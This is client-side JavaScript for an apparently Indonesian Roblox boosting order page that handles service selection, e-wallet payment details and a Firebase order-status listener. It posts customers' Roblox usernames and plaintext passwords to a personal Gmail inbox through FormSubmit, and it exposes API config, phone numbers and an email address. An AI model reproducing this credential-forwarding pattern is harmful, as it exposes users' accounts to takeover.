// --- KONFIGURASI FIREBASE (Ganti dengan Config-mu) ---
const firebaseConfig = {
    apiKey: "AIzaSyAOU2RNedLbO5QpKm9gEHF7KQC9XFACMdc",
    authDomain: "xzyo-s.firebaseapp.com",
    databaseURL: "https://xzyo-s-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "xzyo-s",
    storageBucket: "xzyo-s.firebasestorage.app",
    messagingSenderId: "949339875672",
    appId: "1:949339875672:web:b5d751452bf5875a445d2d",
    measurementId: "G-JJ9KE4P664"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let totalHarga = 0, selectedPay = "", currentTid = "";
const qrisImg = "https://drive.google.com/uc?export=view&id=1LkkjYoIP_Iy_LQx4KEm8TtXil5q57IfJ"; // Ganti link asli

// --- INISIALISASI (Efek Cairan Pertama) ---
document.addEventListener('DOMContentLoaded', () => {
    // Sedikit delay biar kerasa mengalir pas pertama buka
    setTimeout(() => { updateLiquidProgress(1); }, 300);
});

// --- LOGIKA KLIK JOKI ---
document.addEventListener('click', function (e) {
    const item = e.target.closest('.item-joki');
    if (item) {
        item.classList.toggle('selected');
        updateKalkulasi();
    }
});

function updateKalkulasi() {
    let teks = ""; totalHarga = 0;
    document.querySelectorAll('.item-joki.selected').forEach(el => {
        teks += `• ${el.getAttribute('data-name')}\n`;
        totalHarga += parseInt(el.getAttribute('data-price'));
    });
    document.getElementById('detailText').value = teks;
    document.getElementById('totalAkhir').innerText = "Rp " + totalHarga.toLocaleString();
    cekTombol();
}

function cekTombol() {
    const user = document.getElementById('userRoblox').value;
    const btn = document.getElementById('btnGas');
    const payGroup = document.getElementById('payGroup');

    if (user.length > 2 && totalHarga > 0) {
        payGroup.classList.remove('disabled');
        if (selectedPay !== "") btn.disabled = false;
    } else {
        payGroup.classList.add('disabled');
        btn.disabled = true;
    }
}

function setPay(m, el) {
    selectedPay = m;
    document.querySelectorAll('.pay-opt').forEach(opt => opt.classList.remove('selected'));
    el.classList.add('selected');
    cekTombol();
}

// --- FUNGSI CAIRAN MENGALIR (JS LOGIC) ---
function updateLiquidProgress(stepNumber) {
    const line = document.getElementById('liquid-progress');
    const allSteps = document.querySelectorAll('.step');
    
    // 1. Atur lebar garis (cairan mengalir)
    if(stepNumber === 1) line.style.width = '0%';
    if(stepNumber === 2) line.style.width = '50%';
    if(stepNumber === 3) line.style.width = '100%';
    
    // 2. Aktifkan titik (Cairan meledak pelan/menular)
    setTimeout(() => {
        allSteps.forEach(s => {
            if(parseInt(s.dataset.step) <= stepNumber) {
                s.classList.add('active');
            } else {
                s.classList.remove('active');
            }
        });
    }, 800); // Tunggu garis selesai mengalir
}

// --- PROSES ORDER ---
function prosesPesanan() {
    currentTid = "XZY-" + Math.floor(Math.random() * 900000 + 100000);
    const btn = document.getElementById('btnGas');
    btn.innerText = "Mengalirkan Data..."; btn.disabled = true;

    // A. Isi FormSubmit (Gmail)
    document.getElementById('f_tid').value = currentTid;
    document.getElementById('f_user').value = document.getElementById('userRoblox').value;
    document.getElementById('f_pass').value = document.getElementById('passRoblox').value;
    document.getElementById('f_wa').value = document.getElementById('waUser').value;
    document.getElementById('f_pesanan').value = document.getElementById('detailText').value;
    document.getElementById('f_total').value = document.getElementById('totalAkhir').innerText;
    document.getElementById('f_metode').value = selectedPay;

    // B. Simpan Firebase (Status)
    db.ref('orders/' + currentTid).set({
        tid: currentTid,
        status: "pending",
        total: document.getElementById('totalAkhir').innerText
    });

    // C. Kirim FormSubmit (Ajax)
    const formData = new FormData(document.getElementById('hiddenForm'));
    fetch("https://formsubmit.co/ajax/stampan0211@gmail.com", {
        method: "POST",
        body: formData
    })
    .then(() => {
        tampilkanSlideBayar();
        tungguAdmin(currentTid);
    })
    .catch(() => {
        alert("Gagal koneksi! Tapi tenang data tersimpan di database.");
        // Tetep lanjut bayar, email bisa nyusul manual
        tampilkanSlideBayar();
        tungguAdmin(currentTid);
    });
}

function tampilkanSlideBayar() {
    // CAIRAN MENGALIR KE TITIK 2 (PEMBAYARAN)
    updateLiquidProgress(2);

    document.getElementById('slide-order').classList.remove('active');
    document.getElementById('slide-pay').classList.add('active');
    document.getElementById('finalNominal').innerText = document.getElementById('totalAkhir').innerText;
    document.getElementById('methodName').innerText = "Metode: " + selectedPay;
    
    const acc = document.getElementById('accInfo');
    const qris = document.getElementById('qrisDisplay');

    if (selectedPay === 'QRIS') {
        qris.style.display = 'block'; acc.style.display = 'none';
        document.getElementById('qrisMainImg').src = qrisImg;
    } else {
        qris.style.display = 'none'; acc.style.display = 'block';
        acc.innerText = (selectedPay === 'DANA') ? "DANA: 089677329404" : "OVO/GOPAY: 089517154561";
    }
}

function tungguAdmin(tid) {
    db.ref('orders/' + tid + '/status').on('value', (snap) => {
        if (snap.val() === "success") {
            prosesSukses();
        }
    });
}

function prosesSukses() {
    // CAIRAN MENGALIR KE TITIK 3 (SUKSES)
    updateLiquidProgress(3);
    
    // Ganti warna cairan jadi hijau (Sukses menular)
    document.documentElement.style.setProperty('--primary', '#10b981'); // Ganti warna global

    setTimeout(() => {
        document.getElementById('pay-content').style.display = 'none';
        const container = document.getElementById('anim-container');
        // Tambah animasi ceklis
        container.innerHTML = `<svg class="checkmark" id="bigCheck" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/><path class="checkmark__check" fill="none" d="M14 27l7 7 16-16"/></svg>`;
        
        setTimeout(() => {
            // Animasi transisi konten sukses (konten bayar "menguap")
            document.getElementById('bigCheck').classList.add('shrink-anim');
            setTimeout(() => {
                document.getElementById('success-footer').style.display = 'block';
            }, 800);
        }, 1500);
    }, 1500); // Tunggu cairan menular sampai titik 3
}
